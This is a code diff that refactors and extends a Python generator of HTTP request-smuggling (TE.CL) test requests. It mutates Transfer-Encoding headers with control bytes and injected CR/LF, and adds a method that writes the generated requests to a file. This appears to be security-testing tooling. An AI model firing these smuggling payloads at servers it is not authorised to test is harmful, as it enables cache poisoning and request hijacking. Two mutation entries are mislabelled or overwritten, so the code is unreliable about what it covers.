@@ -7,8 +7,8 @@ from core.types.httpRequestPrototype import HttpRequestPrototype
 
 
 class HttpTeCl:
-    def __init__(self, url, gadget_dict: dict = None, verbose: bool = False) -> None:
 
+    def __init__(self, url, gadget_dict: dict = None, verbose: bool = False) -> None:
         self.url = url
         self.host, self.port, self.netloc, self.uri = self.urlParser(url)
         self.gadget_dict: dict[str, str] = gadget_dict
@@ -16,23 +16,11 @@ class HttpTeCl:
         self.verbose = verbose
 
     def generate(self) -> None:
-
         # Random shocking characters insertion
-        for shockers in range(0x1, 0xFF):
-
-            self.mutants_list["keystart-%02x" % shockers] = self.httpTemplate(
-                "%cTransfer-Encoding" % shockers, "chunked")
-
-            self.mutants_list["keyend-%02x" % shockers] = self.httpTemplate(
-                "Transfer-Encoding%c" % shockers, "chunked")
-
-            self.mutants_list["valuestart-%02x" % shockers] = self.httpTemplate(
-                "Transfer-Encoding", "%cchunked" % shockers)
-            
-            self.mutants_list["valueend-%02x" % shockers] = self.httpTemplate(
-                "Transfer-Encoding", "chunked%c" % shockers)
-
-
+        self.__pointMutation()
+        self.__doublePointMutation()
+        self.__xInsertionPointMutation()
+        
     def httpTemplate(self, tecl_name: str, tecl_value: str, http_body: str = "0\r\n\r\nX") -> HttpRequestPrototype:
 
         mutant = HttpRequestPrototype(self.gadget_dict)
@@ -45,6 +33,63 @@ class HttpTeCl:
         mutant.addHeader(tecl_name, tecl_value)
         mutant.body = http_body
         return mutant
+
+    def __pointMutation(self):
+        # Random shocking characters insertion
+        for shockers in range(0x1, 0xFF):
+
+            # single mutations
+            self.mutants_list["point-key-start-%02x" % shockers] = self.httpTemplate(
+                "%cTransfer-Encoding" % shockers, "chunked")
+
+            self.mutants_list["point-key-end-%02x" % shockers] = self.httpTemplate(
+                "Transfer-Encoding%c" % shockers, "chunked")
+
+            self.mutants_list["point-value-start-%02x" % shockers] = self.httpTemplate(
+                "Transfer-Encoding", "%cchunked" % shockers)
+
+            self.mutants_list["point-value-end-%02x" % shockers] = self.httpTemplate(
+                "Transfer-Encoding", "chunked%c" % shockers)
+
+    def __doublePointMutation(self):
+
+        for shockers in range(0x1, 0xFF):
+            self.mutants_list["double-start-start-%02x" % shockers] = self.httpTemplate(
+                "%cTransfer-Encoding" % shockers, "%cchunked" % shockers)
+            self.mutants_list["double-end-end-%02x" % shockers] = self.httpTemplate(
+                "Transfer-Encoding%c" % shockers, "chunked%c" % shockers
+            )
+            self.mutants_list["double-start-end-%02x" % shockers] = self.httpTemplate(
+                "%cTransfer-Encoding" % shockers, "chunked%c" % shockers)
+            self.mutants_list["double-end-start-%02x" % shockers] = self.httpTemplate(
+                "%cTransfer-Encoding" % shockers, "%cchunked" % shockers
+            )
+
+    def __xInsertionPointMutation(self):
+        
+        # X header insertion
+        for shockers in range(0x1, 0xFF):
+            self.mutants_list["X-preheaders-end-%c" % shockers] = self.httpTemplate(
+                "X: X%cTransfer-Encoding"%shockers,"chunked"
+            )
+            self.mutants_list["X-preheaders-start-%c-end-%c" %(shockers,shockers)] = self.httpTemplate(
+                "X:%cX%cTransfer-Encoding"%(shockers,shockers),"chunked"
+            )
+            self.mutants_list["X-preheaders-after-colon-with-%c" % shockers] = self.httpTemplate(
+                "X:%cTransfer-Encoding"%shockers,"chunked"
+            )
+            self.mutants_list["X-preheaders-end-cr-%c" % shockers] = self.httpTemplate(
+                "X: X\r%cTransfer-Encoding"%shockers,"chunked"
+            )
+            self.mutants_list["X-preheaders-end-lf-%c" % shockers] = self.httpTemplate(
+                "X: X\n%cTransfer-Encoding"%shockers,"chunked"
+            )
+            self.mutants_list["X-preheaders-%c-end-lf" % shockers] = self.httpTemplate(
+                "X: X%c\nTransfer-Encoding"%shockers,"chunked"
+            )
+            self.mutants_list["X-preheaders-%c-end-lf" % shockers] = self.httpTemplate(
+                "X: X%c\rTransfer-Encoding"%shockers,"chunked"
+            )
 
     def urlParser(self, url):
 
@@ -64,3 +109,10 @@ class HttpTeCl:
             host, port = netloc.split(':')
 
         return host, port, netloc, uri
+
+    def generateRequestToFile(self , filename : str):
+        with open(filename , "w") as f:
+            for key , value in self.mutants_list.items():
+                obj = f"\n\n------------{key}-------------------\n{value}"
+                f.write(obj)
+
